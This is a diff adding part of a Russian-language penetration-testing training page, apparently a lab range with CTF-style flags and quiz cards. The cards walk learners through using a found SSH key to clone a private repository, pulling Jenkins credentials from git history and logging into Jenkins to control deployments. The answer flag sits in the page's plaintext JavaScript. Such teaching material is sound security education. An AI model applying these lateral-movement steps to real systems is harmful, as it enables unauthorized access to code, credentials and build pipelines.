+    {t:"Настройка Git под найденный ключ и порт", c:"Чтобы git clone по SSH автоматически использовал найденный ключ и порт 2222, что нужно задать?",
+     q:"Как задать Git нужные SSH-параметры для всех операций?", w:"ssh-add id_rsa_backup",
+     h:"export и имя переменной, которую сам git понимает при работе по SSH.",
+     cmd:'export GIT_SSH_COMMAND="ssh -p 2222 -i /home/kali/id_rsa_backup -o IdentitiesOnly=yes -o ConnectTimeout=5"',
+     e:"Задаёт переменную окружения для Git — теперь git clone по SSH автоматически применит порт 2222, нужный ключ и ограничение по времени подключения."},
+    {t:"Клонирование приватного репозитория", c:"Переменная окружения задана, имя репозитория известно. Как склонировать его в папку participant-check?",
+     q:"Какая команда клонирует репозиторий в папку participant-check?", w:"git clone https://10.10.20.10/gitlab_user/internal-configs.git",
+     h:"Обычный git clone, только адрес не https, а в формате пользователь@хост:путь.",
+     cmd:"git clone git@10.10.20.10:gitlab_user/internal-configs.git participant-check",
+     e:"Клонирует приватный репозиторий internal-configs.git в локальную папку participant-check — доступ получен благодаря найденному SSH-ключу."},
+    {t:"Осмотр содержимого репозитория", c:"Репозиторий склонирован. Как зайти внутрь и посмотреть, что в нём есть, включая конфигурацию Ansible?",
+     q:"Как прочитать файл инвентаризации Ansible в репозитории?", w:"cat ansible/ansible.cfg",
+     h:"Ничего особенного — cd, потом обычные ls и cat.",
+     cmd:"cd participant-check\nls\nls ansible\ncat ansible/inventory.yml",
+     e:"Вы заходите в папку проекта, видите каталог ansible (инструмент автоматизации серверов) и читаете файл инвентаризации inventory.yml — список управляемых серверов."},
+    {t:"История коммитов по всем веткам", c:"Текущая ветка может не содержать всей истории. Как посмотреть коммиты из всех веток сразу, в сжатом и наглядном виде?",
+     q:"Какая команда покажет коммиты всех веток компактно?", w:"git log -p",
+     h:"git log, но с флагом, который показывает вообще все ветки, а не только текущую.", cmd:"git log --all --oneline --decorate",
+     e:"--all показывает коммиты из всех веток, --oneline — по одной строке на коммит, --decorate — показывает, куда указывают ветки и теги."},
+    {t:"Учётные данные Jenkins", c:"В списке коммитов нашёлся подозрительный хэш (например, 110a03d). Как посмотреть, что в нём?",
+     q:"Какая команда покажет содержимое конкретного коммита?", w:"git blame ansible/inventory.yml",
+     h:"Та же команда, что показывала HEAD — только вместо HEAD теперь хэш коммита.", cmd:"git show 110a03d",
+     flag:"j3nk1ns_s3cur3_2026!",
+     e:"Показывает содержимое коммита — в нём обнаруживаются учётные данные для Jenkins."}
+   ]},
+   {g:"Сегмент 3 · Jenkins", items:[
+    {t:"Вход в Jenkins", a:1, c:"У вас есть учётные данные Jenkins и его адрес 10.10.20.20:8080. Что дальше?",
+     q:"Как попасть в Jenkins с найденной учётной записью?", w:"Подключиться по SSH на 10.10.20.20",
+     h:"Снова обычная веб-форма логина — учётные данные для неё у вас уже есть.",
+     cmd:"Откройте http://10.10.20.20:8080 и войдите с найденной учётной записью.",
+     e:"Jenkins — сервер автоматизации CI/CD. Получив доступ, вы контролируете процессы сборки и развёртывания — например, задачу deploy-to-prod. На этом текущий сценарий полигона заканчивается — дальнейшие шаги появятся позже."}
+   ]}
+  ];
+  const KEY="prastora_learn_progress";
+  const FKEY="prastora_learn_flags";
+  let done={}, flags={};
+  try{done=JSON.parse(localStorage.getItem(KEY)||"{}")}catch(e){done={}}
+  try{flags=JSON.parse(localStorage.getItem(FKEY)||"{}")}catch(e){flags={}}
+  let total=0;
+  GROUPS.forEach(g=>total+=g.items.length);
+  function save(){try{localStorage.setItem(KEY,JSON.stringify(done))}catch(e){}}
+  function saveFlags(){try{localStorage.setItem(FKEY,JSON.stringify(flags))}catch(e){}}
+  function flagOk(gi,ii,it){return !it.flag || flags[gi+"_"+ii]===it.flag}
+  function groupDone(gi,grp){let n=0;grp.items.forEach((_,ii)=>{if(done[gi+"_"+ii]&&flagOk(gi,ii,grp.items[ii]))n++});return n}
+  function isUnlocked(gi,ii){
+    for(let g=0;g<=gi;g++){
+      const grp=GROUPS[g];
+      const upto=(g<gi)?grp.items.length:ii;
+      for(let i=0;i<upto;i++){
+        if(!done[g+"_"+i] || !flagOk(g,i,grp.items[i])) return false;
+      }
+    }
+    return true;
+  }
+  function applyLocks(){
+    root.querySelectorAll(".lcard").forEach(function(card){
+      const gi=+card.dataset.gi, ii=+card.dataset.ii, it=GROUPS[gi].items[ii];
+      const unlocked=isUnlocked(gi,ii);
+      card.classList.toggle("locked",!unlocked);
+      if(!unlocked && card.classList.contains("open")) card.classList.remove("open");
+      const fl=card.querySelector(".lflag");
+      if(fl) fl.classList.toggle("show", !!it.flag && done[gi+"_"+ii] && !flagOk(gi,ii,it));
+    });
+  }
+  function progress(){
+    const n=Object.keys(done).filter(k=>done[k]).length;
+    document.getElementById("lpct").textContent=n+" / "+total+" шагов";
+    document.getElementById("lbar").style.width=(total?Math.round(n/total*100):0)+"%";
+    document.querySelectorAll(".lnode").forEach(function(node){
+      const gi=+node.dataset.gi, grp=GROUPS[gi], gd=groupDone(gi,grp);
+      node.classList.toggle("full", gd===grp.items.length);
+      node.querySelector("b").textContent=gd+"/"+grp.items.length;
+    });
+    applyLocks();
+  }
+  // --- путь модулей ---
+  const pathRoot=document.getElementById("lpathRoot");
+  GROUPS.forEach((grp,gi)=>{
+    const node=document.createElement("div");
+    node.className="lnode"+(gi===0?" cur":"");
+    node.dataset.gi=gi;
+    node.innerHTML='<div class="lln"></div><div class="ltile" data-a="'+ICONS[gi%ICONS.length]+'" data-w="30"></div><span>'+grp.g+'</span><b>0/'+grp.items.length+'</b>';
+    node.addEventListener("click",function(){
+      document.getElementById("g"+gi).scrollIntoView({behavior:"smooth",block:"start"});
+    });
+    pathRoot.appendChild(node);
+  });
+  if(window.ART_RENDER) pathRoot.querySelectorAll("[data-a]").forEach(window.ART_RENDER);
+  // --- группы и карточки ---
+  GROUPS.forEach((grp,gi)=>{
+    const sec=document.createElement("div");
+    sec.className="lgroup";
+    const h=document.createElement("span");
+    h.id="g"+gi; h.textContent=grp.g;
+    sec.appendChild(h);
+    grp.items.forEach((it,ii)=>{
+      const id=gi+"_"+ii;
+      const card=document.createElement("div");
+      card.className="lcard"+(done[id]?" done":"");
+      card.dataset.gi=gi; card.dataset.ii=ii;
+      const opts=Math.random()<.5?[it.cmd,it.w]:[it.w,it.cmd];
+      card.innerHTML=
+        '<div class="lchead"><div class="lchk">✓</div><span class="ltag">'+(it.a?"ДЕЙСТВИЕ":"ЗАДАЧА")+' '+(ii+1)+'</span><b>'+it.t+'</b><span class="lchev">▾</span></div>'+
+        '<div class="lcbody">'+
+         '<div class="lgoal">'+it.c+'</div>'+
+         '<div class="lqline"><span>Ответьте на вопрос</span><i></i></div>'+
+         '<div class="lq"><p>'+it.q+'</p>'+
+         opts.map(function(o){return '<div class="lopt" data-v="'+(o===it.cmd?"1":"0")+'"><div class="ldot"></div><span></span></div>'}).join("")+
+         '<div class="lmsg"></div>'+
+         '<div class="lqbtns"><button class="btn pu lhintbtn" type="button">💡 Подсказка</button>'+
+         '<button class="btn ghost lsubmitbtn" type="button">Отправить ответ</button></div>'+
+         '<div class="lhint">'+it.h+'</div>'+
+         '<div class="lterm"><b>'+(it.a?"Действие":"Команда")+'</b><pre></pre><div class="lexp">'+it.e+'</div></div>'+
+         (it.flag?'<div class="lflag"><b>Введите флаг, полученный на этом шаге</b><div class="lflagrow"><input type="text" placeholder="флаг" autocomplete="off" spellcheck="false"><button class="btn pu lflagbtn" type="button">Проверить флаг</button></div><div class="lflagmsg"></div></div>':'')+
+         '</div></div>';
+      card.querySelectorAll(".lopt span").forEach(function(sp,i){sp.textContent=opts[i]});
+      card.querySelector("pre").textContent=it.cmd;
+      if(done[id]) card.querySelector(".lterm").classList.add("show");
+      if(it.flag){
+        const fi=card.querySelector(".lflag input");
+        const fb=card.querySelector(".lflagbtn");
+        const fm=card.querySelector(".lflagmsg");
+        if(flags[id]===it.flag){ fm.textContent="Флаг принят."; fm.className="lflagmsg ok"; }
+        function checkFlag(){
+          const v=fi.value.trim();
+          if(v===it.flag){
+            flags[id]=v; saveFlags();
+            fm.textContent="Флаг верный — шаг засчитан."; fm.className="lflagmsg ok";
+            card.querySelector(".lflag").classList.remove("show");
+            if(!done[id]){ done[id]=true; card.classList.add("done"); save(); }
+            progress();
+          }else{
+            fm.textContent="Флаг неверный. Проверьте значение."; fm.className="lflagmsg bad";
+          }
+        }
+        fb.addEventListener("click",checkFlag);
+        fi.addEventListener("keydown",function(e){ if(e.key==="Enter"){ e.preventDefault(); checkFlag(); }});
+      }
+      card.querySelector(".lchead").addEventListener("click",function(){card.classList.toggle("open")});
+      card.querySelectorAll(".lopt").forEach(function(opt){
+        opt.addEventListener("click",function(){
+          card.querySelectorAll(".lopt").forEach(function(o){o.classList.remove("sel")});
+          opt.classList.add("sel");
+        });
+      });
+      card.querySelector(".lhintbtn").addEventListener("click",function(){
+        card.querySelector(".lhint").classList.toggle("show");
+      });
+      card.querySelector(".lsubmitbtn").addEventListener("click",function(){
+        const msg=card.querySelector(".lmsg");
+        const sel=card.querySelector(".lopt.sel");
+        if(!sel){ msg.textContent="Сначала выберите вариант ответа."; msg.className="lmsg warn"; return; }
+        card.querySelectorAll(".lopt").forEach(function(o){o.classList.remove("wrong","right")});
+        if(sel.dataset.v==="1"){
+          sel.classList.add("right");
+          msg.textContent="Верно!"; msg.className="lmsg ok";
+          card.querySelector(".lterm").classList.add("show");
+          if(!done[id]){ done[id]=true; card.classList.add("done"); save(); progress(); }
+          if(it.flag && !flagOk(gi,ii,it)){
+            const fl=card.querySelector(".lflag");
+            if(fl) fl.classList.add("show");
+          }
+        }else{
+          sel.classList.add("wrong");
+          msg.textContent="Неверно, попробуйте ещё раз."; msg.className="lmsg bad";
+        }
+      });
+      sec.appendChild(card);
+    });
+    root.appendChild(sec);
+  });
+  progress();
+  document.getElementById("lreset").addEventListener("click",function(e){
+    e.preventDefault();
+    done={}; flags={}; save(); saveFlags(); progress();
+    root.querySelectorAll(".lcard").forEach(c=>{
+      c.classList.remove("done");
+      c.querySelectorAll(".lopt").forEach(o=>o.classList.remove("sel","right","wrong"));
+      c.querySelector(".lterm").classList.remove("show");
+      c.querySelector(".lmsg").textContent="";
+      const fl=c.querySelector(".lflag");
+      if(fl){ fl.classList.remove("show"); const fi=fl.querySelector("input"); if(fi) fi.value=""; const fm=fl.querySelector(".lflagmsg"); if(fm){ fm.textContent=""; fm.className="lflagmsg"; } }
+    });
+  });
+  document.getElementById("lsw").addEventListener("click",function(){
+    this.classList.toggle("on");
+    document.getElementById("lpathRoot").classList.toggle("hide", !this.classList.contains("on"));
+  });
+})();
+</script>
+</body>
+</html>
